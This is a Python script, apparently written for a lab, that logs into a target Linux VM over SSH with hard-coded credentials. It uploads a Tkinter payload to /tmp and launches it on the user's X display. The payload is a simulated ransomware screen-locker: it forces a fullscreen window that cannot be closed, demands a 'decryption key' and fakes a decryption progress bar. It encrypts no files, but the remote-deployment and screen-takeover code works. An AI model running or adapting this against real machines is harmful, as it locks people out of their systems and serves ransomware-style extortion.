#!/usr/bin/env python3
import sys
import paramiko

# --- LAB CREDENTIALS ---
TARGET_IP = "172.16.1.100" # The hardened Kali VM
USERNAME = "CEO"
PASSWORD = "CEOPass123!"

def main():
    print(f"[*] Preparing to deploy payload to hardened target {TARGET_IP}...")

    # The Tkinter Payload with xdotool bypass and Custom Password Prompt
    payload_script = """#!/usr/bin/env python3
import tkinter as tk
import time
import subprocess
import threading

def force_fullscreen():
    time.sleep(0.5)
    try:
        subprocess.run(["xdotool", "search", "--name", "System Locked", "windowmove", "0", "0"], check=False)
        subprocess.run(["xdotool", "search", "--name", "System Locked", "windowsize", "100%", "100%"], check=False)
        subprocess.run(["xdotool", "search", "--name", "System Locked", "windowraise"], check=False)
    except Exception:
        pass

def pay_ransom():
    # Create a custom pop-up window
    prompt = tk.Toplevel(root)
    prompt.title("Payment Required")
    prompt.geometry("400x150")
    prompt.configure(bg="gray20")
    prompt.attributes('-topmost', True) # Force it above the black screen
    prompt.resizable(False, False)
    
    # Center the popup on the screen
    screen_width = root.winfo_screenwidth()
    screen_height = root.winfo_screenheight()
    x = (screen_width // 2) - 200
    y = (screen_height // 2) - 75
    prompt.geometry(f"400x150+{x}+{y}")

    # Block closing the prompt via the X button without a password
    prompt.protocol("WM_DELETE_WINDOW", lambda: None)

    tk.Label(prompt, text="Enter the decryption key:", bg="gray20", fg="white", font=("Courier", 14)).pack(pady=10)
    
    entry = tk.Entry(prompt, show="*", font=("Courier", 14))
    entry.pack(pady=5)
    entry.focus_set()

    def check_password():
        if entry.get() == "Ransomware2026!":
            prompt.destroy()
            lbl.config(text="Decrypting...")
            root.update()
            for i in range(0, 101, 10):
                lbl.config(text=f"Decrypting your files... {i}%")
                root.update()
                time.sleep(0.2)
            root.destroy()
        else:
            # Flash red on error
            entry.delete(0, tk.END)
            prompt.configure(bg="darkred")
            time.sleep(0.2)
            prompt.configure(bg="gray20")

    tk.Button(prompt, text="Submit", command=check_password, bg="gray50", fg="white", font=("Courier", 12)).pack(pady=5)
    entry.bind('<Return>', lambda event: check_password())

root = tk.Tk()
root.title("System Locked")
root.configure(background='black')
root.overrideredirect(True)

screen_width = root.winfo_screenwidth()
screen_height = root.winfo_screenheight()
root.geometry(f"{screen_width}x{screen_height}+0+0")
root.attributes('-topmost', True) 

lbl = tk.Label(root, text="Your Kali files have been simulated-encrypted!\\nClick below to end.", 
               fg="lime", bg="black", font=("Courier", 30, "bold"))
lbl.pack(expand=True, fill='both')

btn = tk.Button(root, text="Pay Ransom", command=pay_ransom, 
                bg="darkred", fg="white", font=("Courier", 20, "bold"))
btn.pack(side="bottom", pady=50)

root.protocol("WM_DELETE_WINDOW", lambda: None)

threading.Thread(target=force_fullscreen, daemon=True).start()

root.mainloop()
"""

    try:
        print("[*] Connecting via SSH...")
        ssh = paramiko.SSHClient()
        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        ssh.connect(TARGET_IP, username=USERNAME, password=PASSWORD)
        
        print("[*] Uploading payload to /tmp/ransom_sim.py...")
        sftp = ssh.open_sftp()
        with sftp.file('/tmp/ransom_sim.py', 'w') as f:
            f.write(payload_script)
        ssh.exec_command("chmod +x /tmp/ransom_sim.py")
        sftp.close()

        print("[*] Triggering GUI using active Xauthority...")
        exec_cmd = (
            f"export DISPLAY=:0; "
            f"export XAUTHORITY=/home/{USERNAME}/.Xauthority; "
            f"nohup python3 /tmp/ransom_sim.py > /tmp/gui_out.log 2>&1 &"
        )
        
        ssh.exec_command(exec_cmd)
        
        print("[+] Attack simulation launched. Check the Hardened Kali VM screen!")
        ssh.close()

    except paramiko.AuthenticationException:
        print("[-] Authentication failed. Check your credentials.")
    except Exception as e:
        print(f"[-] Error: {e}")
        sys.exit(1)

if __name__ == "__main__":
    main()
